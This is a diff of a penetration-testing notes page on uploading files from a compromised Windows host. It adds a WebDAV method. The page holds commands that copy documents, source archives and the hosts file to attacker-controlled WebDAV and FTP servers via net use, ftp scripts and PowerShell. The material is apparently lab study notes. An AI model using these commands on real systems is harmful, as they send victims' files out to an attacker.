@@ -12067,6 +12067,17 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#another-webdav-server-way" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Another WebDav Server way
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -28837,6 +28848,17 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#another-webdav-server-way" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Another WebDav Server way
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -29334,7 +29356,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>When Microsoft is preventing SMB traffic, there is an alternative: running SMB over HTTP with <code>WebDav</code>. <code>WebDAV</code> <a href="https://datatracker.ietf.org/doc/html/rfc4918">(RFC 4918)</a> is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The <code>WebDAV</code> protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. <code>WebDAV</code> can also use HTTPS.</p>
 <p>When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP.</p>
 <h4 id="configuring-webdav-server">Configuring WebDav Server</h4>
-<p>To set up our <a href="../webdav-wsgidav/">WebDav server</a>, we need to install two Python modules, wsgidav and cheroot.</p>
+<p>To set up our <a href="../webdav-wsgidav/">WebDav server</a>, we need to install two Python modules, wsgidav and cheroot.
+pip install wsgidav cheroot</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a>pip<span class="w"> </span>install<span class="w"> </span>wsgidav<span class="w"> </span>cheroot
 </span></code></pre></div></td></tr></table></div>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a>sudo<span class="w"> </span>wsgidav<span class="w"> </span>--host<span class="o">=</span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="o">=</span><span class="m">80</span><span class="w"> </span>--root<span class="o">=</span>/tmp<span class="w"> </span>--auth<span class="o">=</span>anonymous<span class="w"> </span>
@@ -29352,48 +29375,60 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5"></a><span class="nb">copy </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">john</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">SourceCode</span><span class="p">.</span><span class="n">zip</span> <span class="p">\\</span><span class="nv">$ipServer</span><span class="p">\</span><span class="n">DavWWWRoot</span><span class="p">\</span>
 </span></code></pre></div></td></tr></table></div>
 <p>If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.</p>
+<h4 id="another-webdav-server-way">Another WebDav Server way</h4>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span>
+<span class="normal"><a href="#__codelineno-29-2">2</a></span>
+<span class="normal"><a href="#__codelineno-29-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a>mkdir webdav
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2"></a>cd webdav
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3"></a>wsgidav --host=0.0.0.0 --port=80 --root=/home/kali/share/ZEUS/webdav --auth=anonymous 
+</span></code></pre></div></td></tr></table></div>
+<p>In the windows:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span>
+<span class="normal"><a href="#__codelineno-30-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a>net use Z: http://192.168.45.182/
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2"></a>copy &quot;c:\Users\z.thomas\Downloads\Onboarding Document.docx&quot; Z:\  
+</span></code></pre></div></td></tr></table></div>
 <h3 id="ftp-uploads">FTP Uploads</h3>
 <h4 id="run-pyftpdlib-a-ftp-server">Run pyftpdlib, a FTP server</h4>
 <p>We will use module <a href="../pyftpdlib/">pyftpdlib</a>,  with the option <code>--write</code> to allow clients to upload files to our attack host.</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>--port<span class="w"> </span><span class="m">21</span><span class="w"> </span>--write
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>--port<span class="w"> </span><span class="m">21</span><span class="w"> </span>--write
 </span></code></pre></div></td></tr></table></div>
 <h4 id="create-a-command-file-for-the-ftp-client-to-upload-a-file">Create a Command File for the FTP Client to Upload a File</h4>
 <p>Example:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-30-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-30-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-30-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-30-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-30-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-30-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-30-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-30-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-30-10">10</a></span>
-<span class="normal"><a href="#__codelineno-30-11">11</a></span>
-<span class="normal"><a href="#__codelineno-30-12">12</a></span>
-<span class="normal"><a href="#__codelineno-30-13">13</a></span>
-<span class="normal"><a href="#__codelineno-30-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a>C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2"></a>C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3"></a>C:\htb&gt; echo binary &gt;&gt; ftpcommand.txt
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4"></a>C:\htb&gt; echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txt
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5"></a>C:\htb&gt; echo bye &gt;&gt; ftpcommand.txt
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6"></a>C:\htb&gt; ftp -v -n -s:ftpcommand.txt
-</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7"></a>ftp&gt; open 192.168.49.128
-</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8"></a>
-</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9"></a>Log in with USER and PASS first.
-</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10"></a>
-</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11"></a>
-</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12"></a>ftp&gt; USER anonymous
-</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13"></a>ftp&gt; PUT c:\windows\system32\drivers\etc\hosts
-</span><span id="__span-30-14"><a id="__codelineno-30-14" name="__codelineno-30-14"></a>ftp&gt; bye
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-32-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-32-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-32-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-32-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-32-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-32-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-32-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-32-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-32-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-32-10">10</a></span>
+<span class="normal"><a href="#__codelineno-32-11">11</a></span>
+<span class="normal"><a href="#__codelineno-32-12">12</a></span>
+<span class="normal"><a href="#__codelineno-32-13">13</a></span>
+<span class="normal"><a href="#__codelineno-32-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1"></a>C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2"></a>C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3"></a>C:\htb&gt; echo binary &gt;&gt; ftpcommand.txt
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4"></a>C:\htb&gt; echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txt
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5"></a>C:\htb&gt; echo bye &gt;&gt; ftpcommand.txt
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6"></a>C:\htb&gt; ftp -v -n -s:ftpcommand.txt
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7"></a>ftp&gt; open 192.168.49.128
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8"></a>
+</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9"></a>Log in with USER and PASS first.
+</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10"></a>
+</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11"></a>
+</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12"></a>ftp&gt; USER anonymous
+</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13"></a>ftp&gt; PUT c:\windows\system32\drivers\etc\hosts
+</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14"></a>ftp&gt; bye
 </span></code></pre></div></td></tr></table></div>
 <h4 id="powershell-upload-file">PowerShell Upload File</h4>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">UploadFile</span><span class="p">(</span><span class="s1">&#39;ftp://192.168.49.128/ftp-hosts&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\Windows\System32\drivers\etc\hosts&#39;</span><span class="p">)</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-33-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">UploadFile</span><span class="p">(</span><span class="s1">&#39;ftp://192.168.49.128/ftp-hosts&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\Windows\System32\drivers\etc\hosts&#39;</span><span class="p">)</span>
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 7, 2026 21:02:17 UTC"><span class="timeago" datetime="2026-03-07T21:02:17+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 7, 2026 21:02:17 UTC">2026-03-07</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 30, 2026 20:15:40 UTC"><span class="timeago" datetime="2026-03-30T20:15:40+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 30, 2026 20:15:40 UTC">2026-03-30</span></small></br>
 
 
     <small>Created: July 5, 2023 16:04:22</small>
